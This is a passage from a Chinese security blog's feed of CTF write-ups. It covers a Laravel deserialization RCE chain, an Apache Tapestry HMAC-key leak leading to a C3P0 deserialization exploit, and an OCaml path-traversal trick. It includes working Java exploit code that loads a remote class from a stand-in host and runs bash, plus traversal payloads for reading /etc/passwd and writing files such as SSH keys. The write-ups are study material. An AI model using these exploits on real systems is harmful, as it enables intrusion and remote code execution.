is_null($concrete = <span class="keyword">$this</span>-&gt;getContextualConcrete($abstract))) &#123;</span><br><span class="line">            <span class="keyword">return</span> $concrete;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="comment">// If we don't have a registered resolver or concrete for the type, we'll just</span></span><br><span class="line">        <span class="comment">// assume each type is a concrete name and will attempt to resolve it as is</span></span><br><span class="line">        <span class="comment">// since the container should be able to resolve concretes automatically.</span></span><br><span class="line">        <span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="keyword">$this</span>-&gt;bindings[$abstract])) &#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">$this</span>-&gt;bindings[$abstract][<span class="string">'concrete'</span>];</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">return</span> $abstract;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>我们注意到，如果bindings[$abstract]存在，则会返回bindings[$abstract][‘concrete’]。<br>而bindings是类Container的属性，同时注意到类Container中也有可以RCE的call方法。那么现在思路很清晰：我们可以任意实例化类Container的子类，这样在其子类调用call的时候，会触发类Container的call方法，那么即可达成RCE。<br>而这样的类选择类Container的子类：Illuminate\Foundation\Application再好不过。<br>而$abstract的值为Illuminate\Contracts\Console\Kernel。<br>那么此时我们容易知道$bindings只要存在键名为Illuminate\Contracts\Console\Kernel的数组，就能进入该if条件句，那么我们只要按如下进行构造：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">array</span>(</span><br><span class="line">    <span class="string">"Illuminate\Contracts\Console\Kernel"</span>=&gt;<span class="keyword">array</span>(<span class="string">"concrete"</span>=&gt;<span class="string">"Illuminate\Foundation\Application"</span>)</span><br><span class="line">)</span><br></pre></td></tr></table></figure></p><p>就可以保证返回值为Illuminate\Foundation\Application。<br>接下来会判断是否可以build：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (<span class="keyword">$this</span>-&gt;isBuildable($concrete, $abstract)) &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;build($concrete);</span><br><span class="line">        &#125; <span class="keyword">else</span> &#123;</span><br><span class="line">            $object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br><span class="line">        &#125;</span><br></pre></td></tr></table></figure></p><p>我们跟进isBuildable：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">protected</span> <span class="function"><span class="keyword">function</span> <span class="title">isBuildable</span><span class="params">($concrete, $abstract)</span></span></span><br><span class="line"><span class="function">    </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> $concrete === $abstract || $concrete <span class="keyword">instanceof</span> Closure;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure></p><p>如果$concrete和$abstract相等则可以build。<br>但我们现在明显：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="string">'Illuminate\Foundation\Application'</span>;</span><br><span class="line">$abstract = <span class="string">'Illuminate\Contracts\Console\Kernel'</span>;</span><br></pre></td></tr></table></figure></p><p>所以会进入else分支，继续make。<br>而make时，我们注意到：<br><img src="/images/2019-07-18-22-35-43.png" alt=""><br>而else分支传入make的值为：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$object = <span class="keyword">$this</span>-&gt;make($concrete);</span><br></pre></td></tr></table></figure></p><p>这样一来直接就构成了后面：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = <span class="keyword">$this</span>-&gt;getConcrete($abstract);</span><br></pre></td></tr></table></figure></p><p>这次bindings数组里并没有键名为Illuminate\Foundation\Application的数组里，于是直接回返回$abstract的值，这样一来就达到了实例化Illuminate\Foundation\Application的目的：<br><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$concrete = $abstract = <span class="string">'Illuminate\Foundation\Application'</span></span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-18-21-54-57.png" alt=""><br>最后则可以让最后的$this-&gt;app[Kernel::class]的值变为Illuminate\Foundation\Application。为了更加直观，我们在这个位置做如下改写：<br><img src="/images/2019-07-18-21-58-57.png" alt=""><br><img src="/images/2019-07-18-22-00-19.png" alt=""><br>紧接着会调用Illuminate\Foundation\Application父类Illuminate\Container\Container的call方法：<br>vendor/laravel/framework/src/Illuminate/Container/Container.php<br><img src="/images/2019-07-18-18-33-58.png" alt=""><br><img src="/images/2019-07-18-22-03-01.png" alt=""><br>最后走入这个call_user_func_array，而$callback是我们可以控制的system，而getMethodDependencies()，我们跟进：<br><img src="/images/2019-07-18-22-04-15.png" alt=""><br>最后会返回我们需要的参数id，那么这样一来，即可RCE成功：<br><img src="/images/2019-07-18-22-04-56.png" alt=""></p><h3 id="总结-1"><a href="#总结-1" class="headerlink" title="总结"></a>总结</h3><p>laravel整个反序列化RCE链用的非常漂亮：<br>1.类PendingCommand 利用 <strong>destruct触发run()方法<br>2.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 构造数组<br>3.类vendor/laravel/framework/src/Illuminate/Auth/GenericUser.php 利用 </strong>get()魔法方法满足mockConsoleOutput<br>4.利用任意实例化对象，实例化Illuminate\Foundation\Application<br>5.调用call触发父类call方法RCE</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>真实的chain构造远比之前例题中的难上多倍，但整个过程非常有趣，可以学到不少姿势~</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">文章首发于嘶吼 https://www.4hou.com/web/19312.html</span><br></pre></td></tr></table></figure>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;接之前的两篇文章：&lt;br&gt;&lt;figure class=&quot;highlight plain&quot;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&quot;gut
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 0ctf final Web Writeup（2）</title>
    <link href="http://skysec.top/2019/07/12/2019-0ctf-final-Web-Writeup%EF%BC%882%EF%BC%89/"/>
    <id>http://skysec.top/2019/07/12/2019-0ctf-final-Web-Writeup（2）/</id>
    <published>2019-07-12T05:12:24.000Z</published>
    <updated>2019-07-16T13:49:14.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>这篇文章接之前留下的坑，主要分析了java Tapestry的一个从文件读取到反序列化RCE的一个漏洞和ocaml的一个小trick。</p><h2 id="hotel-booking-system"><a href="#hotel-booking-system" class="headerlink" title="hotel booking system"></a>hotel booking system</h2><p>发现Tapestry版本号，同时发现该网站是Tapestry的demo，在github已开源：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://github.com/ccordenier/tapestry5-hotel-booking</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-09-24-45.png" alt=""><br>同时题目功能极少，只有search功能：<br><img src="/images/2019-07-16-09-32-19.png" alt=""><br>以及hint信息：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">Anyway, As the project has no usable gadget libraries,</span><br><span class="line">I added C3P0 to pom.xml.</span><br><span class="line"></span><br><span class="line">25wzsxtql</span><br></pre></td></tr></table></figure></p><p>那么大致猜测与其框架Tapestry漏洞有关，尝试搜索相关CVE：<br><img src="/images/2019-07-16-09-26-26.png" alt=""><br><img src="/images/2019-07-16-09-26-45.png" alt=""><br>尝试搜索相关漏洞细节描述，但无果，已知信息只有：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Apache Tapestry before 5.3.6 relies on client-side object storage without checking whether a client has modified an object, which allows remote attackers to cause a denial of service (resource consumption) or execute arbitrary code via crafted serialized data.</span><br></pre></td></tr></table></figure></p><p>那么大概可以判断，应该是没有校验客户端对象是否被更改，直接进行反序列化，触发攻击。<br>既然没有漏洞描述，那么只能自己去挖掘了，通过搜索，找到其fix version：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Implement HMAC signatures on object streams stored on the client (Revision 95846b173d83c2eb42db75dae3e7d5e13a633946)</span><br></pre></td></tr></table></figure></p><p>查看响应commit，发现一些改动：<br>加入hmac签名配置：<br>tapestry-core/src/main/java/org/apache/tapestry5/SymbolConstants.java<br><img src="/images/2019-07-16-09-37-20.png" alt=""><br>在AppModule.java可设置签名key：<br>tapestry-core/src/test/java/org/apache/tapestry5/integration/app1/services/AppModule.java<br><img src="/images/2019-07-13-21-40-37.png" alt=""><br>从fix version commit中并未发现和反序列直接挂钩的修复，应该修复落点在客户端对象校验，确保对象未被修改。但这样存在问题，一旦签名key泄露，那么依然可以进行攻击，随手尝试更改题目中的可疑值t:formdata：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;input value=&quot;P7crGfP9hcuUq9D5E5+kJLaAq8c=:H4sIAAAAAAAAAJWQsUrEQBRFn4HAQkRRtLDXdtbCbbRxEYSFIIFgLZPJM45MZmZnJibbWPkTNn6BbKVfsIWd/+AH2FhYWZhJGsFFsHucd+Ee7uM7hPUaRBOZY3M4rdDMwBoYKVMQqim7QuKoRuvMbESYMih4RjJqkYyzFlLmTjmKfDdFV+m980X0tv3yFcBKDBFT0hklzmiJDjbja3pDh4LKYpg6w2Vx1GgHYde4RGD8X4HEKIbWplVWcmu5kot5fnD5+fAaADS63oKNvsGo2mo0mhYIdgq3AA4iDxM0SQuXJ30wrNdhtX9Z3+K85/GfnkyVWkmUzpJOzP3WvE8/dp6f7k4CCGIYMMHb9CT3fX5DFFi2wG/YIb/ZoG+/2P9xfgP6pMxQxwEAAA==&quot; name=&quot;t:formdata&quot; type=&quot;hidden&quot;&gt;&lt;/input&gt;&lt;div class=&quot;form-group&quot;&gt;&lt;label for=&quot;query&quot; class=&quot;control-label col-md-4&quot;&gt;</span><br></pre></td></tr></table></figure></p><p>得到回显:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">java.io.IOException: Client data associated with the current request appears to have been tampered with (the HMAC signature does not match).</span><br></pre></td></tr></table></figure></p><p>所以应该攻击点确实在t:formdata。<br>那么既然fix version没有明确的修复，只能自己跟了：<br>我们在search下断点，发现最终回来到onAction()：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">Object <span class="title">onAction</span><span class="params">(EventContext context)</span> <span class="keyword">throws</span> IOException</span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line">        ......</span><br><span class="line">        didPushBeanValidationContext = <span class="keyword">true</span>;</span><br><span class="line">        executeStoredActions();</span><br><span class="line">        heartbeat.end();</span><br><span class="line">        ......</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>关键函数executeStoredActions()：<br><img src="/images/2019-07-16-12-05-13.png" alt=""><br>而全局搜索t:formdata，来到路径：<br>org/apache/tapestry5/corelib/components/Form.java<br><img src="/images/2019-07-16-10-04-56.png" alt=""><br>我们跟进FORM_DATA：<br><img src="/images/2019-07-16-10-16-03.png" alt=""><br>发现正是此处调用了客户端传来的t:formdata。<br>看到后续操作：<br><img src="/images/2019-07-16-12-07-01.png" alt=""><br>跟进decodeClientData():<br><img src="/images/2019-07-16-12-08-15.png" alt=""><br>可以发现t:formdata的编码模式：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">GZIP compress</span><br><span class="line">Base64 encode</span><br></pre></td></tr></table></figure></p><p>然后会来到反序列化阶段，但需要注意的是5.3.8和5.4.3不太一样：<br><img src="/images/2019-07-16-12-14-45.png" alt=""><br>会多一个:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">boolean</span> cancelAction = ois.readBoolean();</span><br></pre></td></tr></table></figure></p><p>那么最后的落点大致都清楚了，关键点在于怎么拿到签名key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://tapestry.apache.org/assets.html#Assets-AssetSecurity</span><br></pre></td></tr></table></figure></p><p>可以发现这里有提到tapestry的安全问题，我们试一下：<br><img src="/images/2019-07-16-13-08-16.png" alt=""><br>我们尝试访问：<br><img src="/images/2019-07-16-13-10-18.png" alt=""><br>发现可以成功列目录，同时有提到<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Fortunately, this can&apos;t happen. Files with extension &quot;.class&quot; are secured; they must be accompanied in the URL with a query parameter that is the MD5 hash of the file&apos;s contents. If the query parameter is absent, or doesn&apos;t match the actual file&apos;s content, the request is rejected.</span><br></pre></td></tr></table></figure></p><p>但这里的md5 hash似乎并没有起到安全保护的能力，而是会自动跳转到正确的hash：<br><img src="/images/2019-07-16-13-12-53.png" alt=""><br>所以我们可以尝试读取签名key文件内容，根据之前的fix version commit，我们知道key一般定义在：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">services/AppModule.java</span><br></pre></td></tr></table></figure></p><p>我们尝试访问该文件，hash md5我们随便填写<br><img src="/images/2019-07-16-13-16-45.png" alt=""><br>发现可以列目录，得到:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AppModule.class</span><br><span class="line">AppModule$1.class</span><br><span class="line">Authenticator.class</span><br><span class="line">BasicAuthenticator.class</span><br></pre></td></tr></table></figure></p><p>读取AppModule.class后进行反编译，得到签名key：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://192.168.1.106:10000/assets/app/e3d6c19d/services/AppModule.class</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-13-18-51.png" alt=""><br>最后就是exp的构造了：<br>题目提供了hint:c3p0，我们可以进行检索：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">https://blog.csdn.net/fnmsd/article/details/88959428#c3p0</span><br></pre></td></tr></table></figure></p><p>参考这篇文章可以构造出exp，这里直接使用balsn的exp:<br><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.PoolBackedDataSource;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.internal.services.ClientDataEncoderImpl;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.services.ClientDataEncoder;</span><br><span class="line"><span class="keyword">import</span> org.apache.tapestry5.services.ClientDataSink;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.*;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.sql.SQLException;</span><br><span class="line"><span class="keyword">import</span> java.sql.SQLFeatureNotSupportedException;</span><br><span class="line"><span class="keyword">import</span> java.util.logging.Logger;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> javax.naming.NamingException;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Reference;</span><br><span class="line"><span class="keyword">import</span> javax.naming.Referenceable;</span><br><span class="line"><span class="keyword">import</span> javax.sql.ConnectionPoolDataSource;</span><br><span class="line"><span class="keyword">import</span> javax.sql.PooledConnection;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> com.mchange.v2.c3p0.impl.PoolBackedDataSourceBase;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> ysoserial.payloads.util.Reflections;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Main</span> </span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">static</span> <span class="keyword">public</span> Object <span class="title">getExploit</span><span class="params">(String command)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> sep = command.lastIndexOf(<span class="string">':'</span>);</span><br><span class="line">        <span class="keyword">if</span> ( sep &lt; <span class="number">0</span> ) &#123;</span><br><span class="line">            <span class="keyword">throw</span> <span class="keyword">new</span> IllegalArgumentException(<span class="string">"Command format is: &lt;base_url&gt;:&lt;classname&gt;"</span>);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        String url = command.substring(<span class="number">0</span>, sep);</span><br><span class="line">        String className = command.substring(sep + <span class="number">1</span>);</span><br><span class="line"></span><br><span class="line">        PoolBackedDataSource b = Reflections.createWithoutConstructor(PoolBackedDataSource.class);</span><br><span class="line">        Reflections.getField(PoolBackedDataSourceBase.class, <span class="string">"connectionPoolDataSource"</span>).set(b, <span class="keyword">new</span> PoolSource(className, url));</span><br><span class="line">        <span class="keyword">return</span> b;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="class"><span class="keyword">class</span> <span class="title">PoolSource</span> <span class="keyword">implements</span> <span class="title">ConnectionPoolDataSource</span>, <span class="title">Referenceable</span> </span>&#123;</span><br><span class="line"></span><br><span class="line">        <span class="keyword">private</span> String className;</span><br><span class="line">        <span class="keyword">private</span> String url;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="title">PoolSource</span> <span class="params">( String className, String url )</span> </span>&#123;</span><br><span class="line">            <span class="keyword">this</span>.className = className;</span><br><span class="line">            <span class="keyword">this</span>.url = url;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> Reference <span class="title">getReference</span> <span class="params">()</span> <span class="keyword">throws</span> NamingException </span>&#123;</span><br><span class="line">            <span class="keyword">return</span> <span class="keyword">new</span> Reference(<span class="string">"exploit"</span>, <span class="keyword">this</span>.className, <span class="keyword">this</span>.url);</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        <span class="function"><span class="keyword">public</span> PrintWriter <span class="title">getLogWriter</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLogWriter</span> <span class="params">( PrintWriter out )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">setLoginTimeout</span> <span class="params">( <span class="keyword">int</span> seconds )</span> <span class="keyword">throws</span> SQLException </span>&#123;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">getLoginTimeout</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="number">0</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> Logger <span class="title">getParentLogger</span> <span class="params">()</span> <span class="keyword">throws</span> SQLFeatureNotSupportedException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">()</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line">        <span class="function"><span class="keyword">public</span> PooledConnection <span class="title">getPooledConnection</span> <span class="params">( String user, String password )</span> <span class="keyword">throws</span> SQLException </span>&#123;<span class="keyword">return</span> <span class="keyword">null</span>;&#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        Object exp = getExploit(<span class="string">"http://240.240.240.240:1234/:Exploit"</span>);</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            ClientDataEncoder en = <span class="keyword">new</span> ClientDataEncoderImpl(<span class="keyword">null</span>, <span class="string">"TOP_SECRET_PASSPHRASE_YOU_WILL_NEVER_KNOW:)"</span>, <span class="keyword">null</span>,</span><br><span class="line">                <span class="string">"does not matter"</span>, <span class="keyword">null</span>);</span><br><span class="line">            ClientDataSink sink = en.createSink();</span><br><span class="line">            ObjectOutputStream s = sink.getObjectOutputStream();</span><br><span class="line">            s.writeUTF(<span class="string">"1234"</span>);</span><br><span class="line">            s.writeBoolean(<span class="keyword">true</span>);</span><br><span class="line">            s.writeObject(exp);</span><br><span class="line">            s.close();</span><br><span class="line">            String out = sink.getClientData();</span><br><span class="line">            System.out.println(out);</span><br><span class="line">        &#125; <span class="keyword">catch</span> (IOException i) &#123;</span><br><span class="line">            i.printStackTrace();</span><br><span class="line">            <span class="keyword">return</span>;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Exploit</span> </span>&#123; </span><br><span class="line">  <span class="function"><span class="keyword">public</span> <span class="title">Exploit</span><span class="params">()</span> </span>&#123; </span><br><span class="line">    <span class="keyword">try</span> &#123; </span><br><span class="line">      Runtime.getRuntime().exec(<span class="keyword">new</span> String[]&#123;<span class="string">"bash"</span>, <span class="string">"-c"</span>,</span><br><span class="line">        <span class="string">"sleep 5"</span></span><br><span class="line">      &#125;).waitFor();</span><br><span class="line">    &#125; <span class="keyword">catch</span> (Exception e) &#123; </span><br><span class="line">    &#125; </span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="BabyDB"><a href="#BabyDB" class="headerlink" title="BabyDB"></a>BabyDB</h2><p>题目使用ocaml-cohttp完成了一个web服务，使用文件系统作为数据库，实现了注册，登录，存储，加载等操作。<br>我们观察到其功能：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">match handler with</span><br><span class="line">    | &quot;register&quot; -&gt; register req body args</span><br><span class="line">    | &quot;login&quot; -&gt; test_login req body args</span><br><span class="line">    | &quot;load&quot; -&gt; default_load req body args </span><br><span class="line">    | &quot;store&quot; -&gt; default_store req body args </span><br><span class="line">    | &quot;static&quot; -&gt; static req body args</span><br><span class="line">    | &quot;batch&quot; -&gt; batch req body args</span><br><span class="line">    | _ -&gt; unknown</span><br></pre></td></tr></table></figure></p><p>我们首先进行用户注册：<br><img src="/images/2019-07-16-21-37-17.png" alt=""><br>再进行登录,并尝试文件读取：<br><img src="/images/2019-07-16-21-39-54.png" alt=""><br>发现error，我们查看原因：<br><img src="/images/2019-07-16-21-40-16.png" alt=""><br>由于目录不存在而导致我们目录穿越失败，不能进行文件读取。而这串md5和相关路径来自于以下代码：<br><img src="/images/2019-07-16-21-28-31.png" alt=""><br><img src="/images/2019-07-16-21-29-55.png" alt=""><br>那么很自然想到，需要让用户名为空，得到的md5自然为空，那么就可以进行目录上跳。<br>这里我们观察到login：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">| &quot;login&quot;::args::body::others -&gt; </span><br><span class="line">    let out = match is_default with</span><br><span class="line">    | true -&gt; real_login false (whoami sess) cont req body args</span><br><span class="line">    | false -&gt; real_login true (whoami sess) cont req body args</span><br><span class="line">    in</span><br><span class="line">    out</span><br></pre></td></tr></table></figure></p><p>跟进whoami，发现其为：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">let whoami = fun _ -&gt; SessionState.get</span><br></pre></td></tr></table></figure></p><p>这里可以利用一个trick，使用户名为空，即第一次随意用用户名登录，第二次紧接着用空用户登录，即可构造用户名为空。<br>任意文件读取:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login?sky?:login??:load?../../../../../../etc/passwd?sky</span><br></pre></td></tr></table></figure></p><p><img src="/images/2019-07-16-21-44-27.png" alt=""><br><img src="/images/2019-07-16-21-44-35.png" alt=""><br>但是受制于load中的readfile:<br><img src="/images/2019-07-16-21-17-06.png" alt=""><br><img src="/images/2019-07-16-21-12-40.png" alt=""><br>我们只能读取文件第一行的内容，但flag文件第一行内容并不是flag。但我们注意到还可以使用store进行任意文件写入。<br>这里store的bypass和load一致，不再分析，直接给出exp：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">login?user?user:login??:store?../../../../../../tmp/test_file?test_content</span><br></pre></td></tr></table></figure></p><p>那么这里应该可以想到写入ssh key，从而达成无需输入密码即可连入的目的。那么即可连入题目server，获取flag。</p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>本篇文章结束了之前留下的坑，其实java和ocaml对我来说，都是接触较少的语言，希望以后能有更多机会挑战自己，走出舒适圈XD。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h2 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h2&gt;&lt;p&gt;这篇文章接之前留下的坑，主要分析了java Tapestry的一个从文件读取到反序列化RCE的一个漏洞和ocaml的一个小trick。&lt;/p
      
    
    </summary>
    
      <category term="web" scheme="http://skysec.top/categories/web/"/>
    
    
      <category term="web" scheme="http://skysec.top/tags/web/"/>
    
  </entry>
  
  <entry>
    <title>2019 WCTF &amp; P-door</title>
    <link href="http://skysec.top/2019/07/09/2019-WCTF-P-door/"/>
    <id>http://skysec.top/2019/07/09/2019-WCTF-P-door/</id>
    <published>2019-07-09T07:11:11.000Z</published>
    <updated>2019-07-10T13:52:21.000Z</updated>
    
